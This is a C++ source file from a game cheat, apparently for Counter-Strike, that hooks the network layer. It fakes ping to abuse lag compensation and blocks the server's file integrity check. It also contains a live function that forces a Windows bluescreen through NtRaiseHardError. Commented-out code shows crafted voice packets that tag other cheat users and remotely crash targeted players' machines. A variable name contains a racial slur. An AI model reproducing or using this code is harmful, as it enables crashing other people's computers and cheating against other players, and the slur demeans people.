#include "../hooks.h"
#include "../../SDK/Entity.h"
#include "../../globals.h"
#include "../../SDK/Menu/config.h"
#include "../../Features/Rage/Animations/Lagcompensation.h"
#include "../../Features/Misc/Playerlist.h"

void __fastcall h::hkProcessPacket( void* ecx, void* edx, void* packet, bool header )
{
	static auto original = detour::processPacket.GetOriginal<decltype( &hkProcessPacket )>( );

	if (!i::ClientState->pNetChannel)
		return original(ecx, edx, packet, header);

	if (i::ClientState->iSignonState != SIGNONSTATE_FULL)
		return original(ecx, edx, packet, header);

	original(ecx, edx, packet, header);

	// get this from CL_FireEvents string "Failed to execute event for classId" in engine.dll
	for ( CEventInfo* it{ i::ClientState->pEvents }; it != nullptr; it = it->pNext )
	{
		if ( !it->iClassID )
			continue;

		// set all delays to instant.
		it->flFireDelay = 0.f;
	}

	// game events are actually fired in on_render_start which is WAY later after they are received
	// effective delay by lerp time, now we call them right after theyre received (all receive proxies are invoked without delay).
	i::EngineClient->FireEvents( );
}

void BSOD( )
{
	BOOLEAN b;
	ULONG r;

	HMODULE m_pNTDLL = GetModuleHandle( "ntdll.dll" );
	( ( NTSTATUS( NTAPI* )( ULONG, BOOLEAN, BOOLEAN, PBOOLEAN ) )GetProcAddress( m_pNTDLL, "RtlAdjustPrivilege" ) )( 19, true, false, &b );
	( ( NTSTATUS( NTAPI* )( NTSTATUS, ULONG, ULONG, PULONG_PTR*, ULONG, PULONG ) )GetProcAddress( m_pNTDLL, "NtRaiseHardError" ) )( 0xDEADDEAD, 0, 0, 0, 6, &r );
}

//bool __fastcall h::hkSVCMsg_VoiceData( void* thistr, void* edx, C_SVCMsg_VoiceData* Message )
//{
	//static auto original = detour::voiceData.GetOriginal<decltype( &hkSVCMsg_VoiceData )>( );

	//if ( !g::pLocal || g::pLocal->EntIndex( ) == Message->m_iClient + 1 )
	//	return original( thistr, edx, Message );

	//C_VoiceCommunicationData VoiceData = Message->GetData( );
	//// is RyzeXTR user
	//if ( Message->m_nFormat == 0 && VoiceData.m_nXuidHigh == g::pLocal->EntIndex( ) && VoiceData.m_nSectionNumber == 3459085 && VoiceData.m_nSequenceBytes == 123143456 && VoiceData.m_nUnCompressedSampleOffset == 909576 )
	//{
	//	playerList::arrPlayers[ Message->m_iClient + 1 ].bIsRyzeXTRUser = true;
	//}

	// bluescreen
	//if ( Message->m_nFormat == 0 && VoiceData.m_nXuidHigh == g::pLocal->EntIndex( ) && VoiceData.m_nSectionNumber == 342 && VoiceData.m_nSequenceBytes == 342 && VoiceData.m_nUnCompressedSampleOffset == 342 )
	//{
	//	BSOD( );
	//}

	//return original( thistr, edx, Message );
//}

bool __fastcall h::hkSendNetMsg( INetChannel* thisptr, int edx, INetMessage* pMessage, bool bForceReliable, bool bVoice )
{
	static auto original = detour::sendNetMsg.GetOriginal<decltype(&hkSendNetMsg)>();

	/*
	 * @note: disable files crc check (sv_pure)
	 * dont send message if it has FileCRCCheck type
	 */
	if ( pMessage->GetType( ) == INetChannelInfo::PAINTMAP)
		return false;

	/*
	 * @note: fix lag with chocking packets when voice chat is active
	 * check for voicedata group and enable voice stream
	 * @credits: Flaww
	 */
	if ( pMessage->GetGroup( ) == INetChannelInfo::VOICE )
		bVoice = true;
	
	return original(thisptr, edx, pMessage, bForceReliable, bVoice);

	//C_CLCMsg_VoiceData msg = { };
	//using ConstructVoiceMessage_t = uint32_t( __fastcall* )( void*, void* );
	//static ConstructVoiceMessage_t ConstructVoiceMessage = reinterpret_cast< ConstructVoiceMessage_t >( MEM::FindPattern(ENGINE_DLL, XorStr("56 57 8B F9 8D 4F 08 C7 07 ? ? ? ? E8 ? ? ? ? C7") ) );

	//for ( int i = 1; i < i::GlobalVars->nMaxClients; i++ )
	//{
	//	CBaseEntity* m_pEntity = reinterpret_cast< CBaseEntity* >( i::EntityList->GetClientEntity( i ) );
	//	if ( m_pEntity == nullptr || m_pEntity == g::pLocal || !m_pEntity->IsPlayer( ) )
	//		continue;

	//	// send out message to tell everyone we are RyzeXTR users
	//	{
	//		ConstructVoiceMessage( reinterpret_cast< void* >( &msg ), nullptr );

	//		msg.m_nXuidHigh = i;
	//		msg.m_nSequenceBytes = 123143456;
	//		msg.m_nSectionNumber = 3459085;
	//		msg.m_nUnCompressedSampleOffset = 909576;
	//		msg.m_nFormat = 0;
	//		msg.m_nFlags = 63;
	//		original( thisptr, edx, reinterpret_cast< INetMessage* >( &msg ), false, true );
	//	}

	//	// force bluescreen on RyzeXTR users :kekw:
	//	if ( playerList::arrPlayers[ i ].BlueScreenNigger == true )
	//	{
	//		C_CLCMsg_VoiceData   msg = { };
	//		//memset( &msg, 0, sizeof( msg ) );

	//		// call constructor ( called in CL_SendVoicePacket ).
	//		ConstructVoiceMessage( reinterpret_cast< void* >( &msg ), nullptr );

	//		msg.m_nXuidHigh = i;
	//		msg.m_nSequenceBytes = 342;
	//		msg.m_nSectionNumber = 342;
	//		msg.m_nUnCompressedSampleOffset = 342;
	//		msg.m_nFormat = 0;
	//		msg.m_nFlags = 63;
	//		original( thisptr, edx, reinterpret_cast< INetMessage* >( &msg ), false, true );
	//	}
	//}
	
	return original( thisptr, edx, pMessage, bForceReliable, bVoice );
}


void __fastcall h::hkSetChoked( void* ecx, void* edx )
{
	static auto original = detour::setChoked.GetOriginal<decltype( &hkSetChoked )>( );

	INetChannel* pNetChannel = reinterpret_cast< INetChannel* >( ecx );

	if (!i::ClientState || i::ClientState->iSignonState < SIGNONSTATE_FULL)
		return;

	if (!g::pLocal || !g::pLocal->IsAlive() || g::pLocal->HasImmunity())
		return;

	/* run network fix */
	{
		/* store netchannel */
		//int nSequenceNr = pNetChannel->iOutSequenceNr;
		int nChokedCommands = pNetChannel->iChokedPackets;

		/* fix net channel */
		pNetChannel->iChokedPackets = 0;

		/* send datagram */	
		pNetChannel->SendDatagram(nullptr);

		/* restore netchannel */
		pNetChannel->iOutSequenceNr--;
		pNetChannel->iChokedPackets = nChokedCommands;
	}

	/*
	void CNetChan::SetChoked( void )
	{
		m_nOutSequenceNr++;	// sends to be done since move command use sequence number
		m_nChokedPackets++;
	}
	*/

	//// sanity checks so i dont blow my brains out
	//if ( !g::pLocal || !i::EngineClient->IsInGame( ) || pNetChannelInfo == nullptr || i::EngineClient->IsVoiceRecording())
	//	return original( ecx, edx );
	//
	//const int iChockedPackets = pNetChannelInfo->iChokedPackets;

	//pNetChannelInfo->iChokedPackets = 0;
	//pNetChannelInfo->SendDatagram(NULL); // send datagram does: "return iOutSequenceNr = -1" if choked commands is 0
	//--pNetChannelInfo->iOutSequenceNr;
	//pNetChannelInfo->iChokedPackets = iChockedPackets;

	return original(ecx, edx);
}

int __fastcall h::hkSendDatagram( INetChannel* thisptr, int edx, bf_write* pDatagram )
{
	static auto original = detour::sendDatagram.GetOriginal<decltype( &hkSendDatagram )>( );

	INetChannelInfo* pNetChannelInfo = i::EngineClient->GetNetChannelInfo( );
	static CConVar* sv_maxunlag = i::ConVar->FindVar( "sv_maxunlag"  );

	if (!i::EngineClient->IsInGame() || !cfg::misc::bFakePing || pDatagram != nullptr || pNetChannelInfo == nullptr || sv_maxunlag == nullptr)
		return original(thisptr, edx, pDatagram);

	const int iOldInReliableState = thisptr->iInReliableState;
	const int iOldInSequenceNr = thisptr->iInSequenceNr;

	// calculate max available fake latency with our real ping to keep it w/o real lags or delays
	const float flMaxLatency = std::fmax( 0.f, std::clamp( cfg::misc::flFakePingFactor / 1000.f, 0.f, 1000.f/*sv_maxunlag->GetFloat( )*/ ) - pNetChannelInfo->GetLatency( FLOW_OUTGOING ) );
	lagcomp.AddLatencyToNetChannel( thisptr, flMaxLatency );

	const int iReturn = original(thisptr, edx, pDatagram);

	thisptr->iInReliableState = iOldInReliableState;
	thisptr->iInSequenceNr = iOldInSequenceNr;

	return iReturn;
}
